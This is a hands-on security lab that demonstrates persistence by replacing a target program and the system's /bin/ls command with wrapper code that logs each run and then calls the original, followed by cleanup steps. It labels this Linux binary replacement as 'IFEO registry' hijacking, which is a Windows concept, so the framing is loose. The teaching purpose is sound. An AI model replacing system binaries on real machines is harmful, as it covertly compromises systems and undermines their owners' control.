 Apply IFEO Registry Hijack for Persistence
Learning Objectives
By completing this lab, you will:

Understand IFEO (Image File Execution Options) registry hijacking techniques
Implement IFEO-based persistence mechanisms on Linux systems
Test and verify persistence execution methods
Analyze registry-like persistence using Linux system files
Prerequisites
Basic Linux command line knowledge
Understanding of process execution and system startup
Familiarity with text editors (nano, vim)
Knowledge of file permissions and system directories
Lab Environment
Al Nafi provides Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated Linux machine. The provided system is bare metal with no pre-installed tools, so you will install required tools during the lab exercises.

Task 1: Modify System Files to Hijack Executable Loading
Subtask 1.1: Install Required Tools
# Update system packages
sudo apt update

# Install necessary tools
sudo apt install -y gcc make strace procps

# Verify installations
which gcc strace ps
Subtask 1.2: Create Target Executable
# Create a simple target program
cat > /tmp/target_app.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

int main() {
    printf("Original target application running...\n");
    printf("PID: %d\n", getpid());
    sleep(5);
    printf("Target application finished.\n");
    return 0;
}
EOF

# Compile the target application
gcc -o /tmp/target_app /tmp/target_app.c

# Make it executable
chmod +x /tmp/target_app
Subtask 1.3: Create Hijack Payload
# Create the hijacking payload
cat > /tmp/hijack_payload.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
    printf("[HIJACK] Persistence payload executed!\n");
    printf("[HIJACK] Original command: %s\n", argv[0]);
    printf("[HIJACK] PID: %d\n", getpid());
    
    // Log the hijack attempt
    system("echo \"$(date): IFEO hijack executed\" >> /tmp/hijack_log.txt");
    
    // Execute original program if it exists
    if (access("/tmp/target_app_original", F_OK) == 0) {
        printf("[HIJACK] Executing original program...\n");
        execv("/tmp/target_app_original", argv);
    }
    
    return 0;
}
EOF

# Compile the hijack payload
gcc -o /tmp/hijack_payload /tmp/hijack_payload.c
chmod +x /tmp/hijack_payload
Subtask 1.4: Implement IFEO-Style Hijacking
# Backup original executable
cp /tmp/target_app /tmp/target_app_original

# Replace target with hijack payload
cp /tmp/hijack_payload /tmp/target_app

# Verify the hijack is in place
ls -la /tmp/target_app*
Subtask 1.5: Create System-Wide Persistence
# Create a system binary hijack (requires sudo)
sudo cp /bin/ls /bin/ls_original

# Create wrapper script for ls command
cat > /tmp/ls_wrapper.sh << 'EOF'
#!/bin/bash
echo "$(date): ls command hijacked" >> /tmp/system_hijack_log.txt
/bin/ls_original "$@"
EOF

chmod +x /tmp/ls_wrapper.sh
sudo cp /tmp/ls_wrapper.sh /bin/ls
Task 2: Test Persistence and Execution
Subtask 2.1: Test Local Executable Hijack
# Test the hijacked target application
echo "Testing local executable hijack:"
/tmp/target_app

# Check hijack log
echo "Checking hijack log:"
cat /tmp/hijack_log.txt
Subtask 2.2: Test System Command Hijack
# Test the hijacked ls command
echo "Testing system command hijack:"
ls /tmp/

# Check system hijack log
echo "Checking system hijack log:"
cat /tmp/system_hijack_log.txt
Subtask 2.3: Verify Persistence Across Sessions
# Create a script to test persistence
cat > /tmp/test_persistence.sh << 'EOF'
#!/bin/bash
echo "=== Persistence Test ==="
echo "Testing target_app hijack:"
/tmp/target_app

echo "Testing ls hijack:"
ls /home/ > /dev/null

echo "Checking logs:"
echo "Hijack log entries:"
wc -l /tmp/hijack_log.txt
echo "System hijack log entries:"
wc -l /tmp/system_hijack_log.txt
EOF

chmod +x /tmp/test_persistence.sh
/tmp/test_persistence.sh
Subtask 2.4: Monitor Process Execution
# Monitor processes during hijack execution
echo "Monitoring process execution:"

# Run target in background and monitor
/tmp/target_app &
TARGET_PID=$!

# Check process tree
ps -ef | grep target_app
ps -ef | grep hijack

# Wait for completion
wait $TARGET_PID
Subtask 2.5: Analyze Hijack Effectiveness
# Create analysis script
cat > /tmp/analyze_hijack.sh << 'EOF'
#!/bin/bash
echo "=== IFEO Hijack Analysis ==="

echo "1. File modifications:"
ls -la /tmp/target_app* /bin/ls*

echo "2. Log analysis:"
echo "Total hijack attempts: $(wc -l < /tmp/hijack_log.txt 2>/dev/null || echo 0)"
echo "System command hijacks: $(wc -l < /tmp/system_hijack_log.txt 2>/dev/null || echo 0)"

echo "3. Process verification:"
pgrep -f hijack || echo "No hijack processes currently running"

echo "4. Persistence verification:"
if [ -f /tmp/target_app ] && [ -f /bin/ls ]; then
    echo "Hijacks are persistent and in place"
else
    echo "Some hijacks may have been removed"
fi
EOF

chmod +x /tmp/analyze_hijack.sh
/tmp/analyze_hijack.sh
Cleanup and Restoration
# Restore original files
sudo cp /bin/ls_original /bin/ls
sudo rm -f /bin/ls_original
cp /tmp/target_app_original /tmp/target_app

# Clean up temporary files
rm -f /tmp/hijack_payload /tmp/ls_wrapper.sh
rm -f /tmp/target_app.c /tmp/hijack_payload.c
rm -f /tmp/test_persistence.sh /tmp/analyze_hijack.sh

echo "System restored to original state"
Verification Commands
# Final verification
echo "=== Final Verification ==="
echo "Original target app restored:"
/tmp/target_app

echo "Original ls command restored:"
ls /tmp/ | head -3

echo "Logs preserved for analysis:"
ls -la /tmp/*log.txt
Conclusion
In this lab, you successfully implemented IFEO-style registry hijacking techniques on a Linux system by:

Creating executable hijacks that intercept program execution
Implementing system-wide command hijacking for persistence
Testing and verifying hijack effectiveness across different scenarios
Analyzing the persistence mechanisms and their impact
This technique demonstrates how attackers can maintain persistence by hijacking commonly used executables and system commands. Understanding these methods is crucial for cybersecurity professionals to detect and prevent such attacks in real-world environments. The hijacking approach shown here mimics Windows IFEO registry attacks but uses Linux file system manipulation to achieve similar persistence goals.
